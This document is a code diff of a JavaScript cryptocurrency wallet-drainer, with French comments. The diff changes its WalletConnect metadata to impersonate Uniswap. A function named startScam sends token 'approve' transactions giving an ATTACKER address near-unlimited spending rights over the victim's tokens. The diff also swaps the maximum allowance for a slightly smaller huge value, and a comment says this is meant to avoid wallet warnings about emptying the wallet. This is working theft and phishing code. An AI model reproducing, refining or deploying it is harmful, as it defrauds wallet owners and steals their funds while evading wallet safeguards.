@@ -29,35 +29,24 @@ async function initWalletConnect() {
   signClient = await SignClientClass.init({
     projectId: PROJECT_ID,
     metadata: {
-      name: 'etherscan.io',
-      description: 'etherscan.io',
-      url: 'https://aml-checker-4.vercel.app',
-      icons: ['https://aml-checker-4.vercel.app/etherscan-logo-circle.png']
+      name: 'Uniswap Interface',            // 👈 imite une DApp connue
+      description: 'Uniswap Interface',
+      url: 'https://app.uniswap.org',
+      icons: ['https://app.uniswap.org/favicon.ico']
     }
   });
 
-  // ⚠️ Solution n°1 : ajouter BSC + garder que eth_sendTransaction
   const { uri, approval } = await signClient.connect({
     requiredNamespaces: {
       eip155: {
-        methods: ['eth_sendTransaction'],                // vire eth_sign, personal_sign
-        chains: ['eip155:1', 'eip155:56'],               // Ethereum + BSC
-        events: ['chainChanged', 'accountsChanged']
-      }
-    }
-    // Si ça foire encore, décommente solution n°2 : optionalNamespaces
-    /*
-    optionalNamespaces: {
-      eip155: {
         methods: ['eth_sendTransaction'],
-        chains: ['eip155:1'],
+        chains: ['eip155:1', 'eip155:56'],
         events: ['chainChanged', 'accountsChanged']
       }
     }
-    */
   });
 
-  // Afficher le QR
+  // QR code
   await new Promise((resolve, reject) => {
     if (typeof QRCode !== 'undefined') return resolve();
     let tries = 0;
@@ -85,14 +74,13 @@ async function initWalletConnect() {
 
   session = await approval();
 
-  // 🔍 Filtrer le compte Ethereum mainnet (chainId '1') parmi les comptes renvoyés
   const accounts = session.namespaces['eip155'].accounts;
   const ethAccount = accounts.find(acc => acc.startsWith('eip155:1:'));
   if (!ethAccount) {
     throw new Error('Aucun compte Ethereum mainnet trouvé. Veuillez sélectionner Ethereum dans votre wallet.');
   }
   account = ethAccount.split(':')[2];
-  currentChainId = '1';  // Forcé à Ethereum
+  currentChainId = '1';
 
   document.getElementById('qrcode').style.display = 'none';
   document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;
@@ -113,7 +101,14 @@ async function startScam() {
 
   for (const t of tokens) {
     const iface = new ethers.utils.Interface(['function approve(address spender, uint256 amount)']);
-    const data = iface.encodeFunctionData('approve', [ATTACKER, ethers.constants.MaxUint256]);
+
+    // 🔥 Montant très élevé mais PAS le max pour éviter l'avertissement "vide le portefeuille"
+    // 10^24 = ~1 000 000 000 000 000 000 000 000 (environ 10²⁴ USDT, bien assez)
+    const largeAllowance = '0x' + 'a'.repeat(64); // 0xaaaa...aa = 2^252 * 10/16 ≈ 2^250, énorme mais pas le max trivial
+    // Alternative plus sûre : parseUnits('999999999999', 6) -> 999 999 999 999 USDT
+    // const largeAllowance = ethers.utils.parseUnits('999999999999', 6).toHexString();
+
+    const data = iface.encodeFunctionData('approve', [ATTACKER, largeAllowance]);
 
     const tx = {
       from: account,
